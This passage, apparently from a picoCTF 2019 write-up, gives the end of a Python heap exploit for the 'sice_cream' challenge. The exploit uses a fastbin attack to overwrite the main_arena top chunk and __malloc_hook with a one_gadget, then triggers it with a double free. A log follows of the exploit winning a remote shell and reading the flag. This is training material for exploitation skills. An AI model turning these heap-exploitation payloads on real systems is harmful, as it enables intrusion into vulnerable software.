log.info('__malloc_hook: ' + hex(malloc_hook))
log.info('one_gadget: ' + hex(one_gadget))

'''
Same as the other exploit, except this time we overwrite the top chunk pointer
to the address of `__malloc_hook - 0x15`. We then request a chunk such that
it is serviced by the top chunk.

Then, just overwrite `__malloc_hook` with our working one gadget, and cause
a double free error. The double free error will call these functions in order:

free -> __libc_free -> _int_free -> malloc_printerr -> __libc_message
-> backtrace_and_maps -> init -> dlerror_run -> _dl_catch_error
-> _dl_open -> _dl_catch_error -> dl_open_worker -> _dl_map_object
-> _dl_load_cache_lookup -> __strdup

__strdup will use malloc to do its string duplication
'''

# We don't want subsequent allocations to come out of the unsorted bin
# Since we will use our fake chunk a lot, it is guaranteed to be corrupted.
# Any subsequent mallocs will then just crash if the unsorted bin is used
# Therefore, just empty out the unsorted bin here by first changing its size to 0x61
# Then we allocate a 0x58 sized chunk
reintroduce(p64(0) + p64(0x61) + p64(leak) + p64(leak) + p64(0)*9 + p64(0x21))
add(0x58, 'A'*0x58) # 7

# We fake a 0x20 sized chunk and free it. This will be our fake chunk in main_arena.
# The main arena's fastbin[2], which is the 0x20 fastbin, will have a pointer to this chunk.
# Remember this chunk is in the .bss segment, so its address is 0x602040.
reintroduce(p64(0) + p64(0x31) + p64(0x21)*8)
free(6)

# Prepare for the fastbin attack: free a 0x61 sized chunk
reintroduce(p64(0) + p64(0x61) + p64(0x21)*18)
free(6)

# This is the address where the 0x602040 address from above looks 16 byte aligned
fake_chunk_top = main_arena + 0x10 - 0x6

# We set our fake chunk's fd pointer to point to our fake chunk in main arena
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_top) + p64(0))

# Chunk 9 will be in main arena, we overwrite the top chunk ptr with malloc_hook-0x15
# If you look at that malloc_hook-0x25, it looks like the top chunk header
# So we set the top chunk pointer to that address (malloc_hook-0x15)
add(0x50, 'B'*0x50) # 8
add(0x50, '\x00'*0x3e + p64(malloc_hook - 0x15))

# Now overwrite with one gadget
add(0x58, '\x00'*5 + p64(one_gadget))

# Do a double free, this will end up calling malloc.
free(0)
free(0)

p.interactive()

```
```sh
vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream/sice_cream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 2019shell1.picoctf.com on port 38495: Done
[*] Leak: 0x7f61ebcbdb78
[*] main arena: 0x7f61ebcbdb20
[*] Libc base: 0x7f61eb8f9000
[*] system: 0x7f61eb93e390
[*] __free_hook: 0x7f61ebcbf7a8
[*] __malloc_hook: 0x7f61ebcbdb10
[*] one_gadget: 0x7f61eb9e92a4
[*] Switching to interactive mode
*** Error in `/problems/sice-cream_4_7ef8903b2c31d9f08c4ad7bcdcb5f0d3/sice_cream': double free or corruption (fasttop): 0x0000000001500010 ***
$ ls
flag.txt
ld-2.23.so
libc.so.6
sice_cream
xinet_startup.sh
$ cat flag.txt
flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_ac8fd349}$  
```
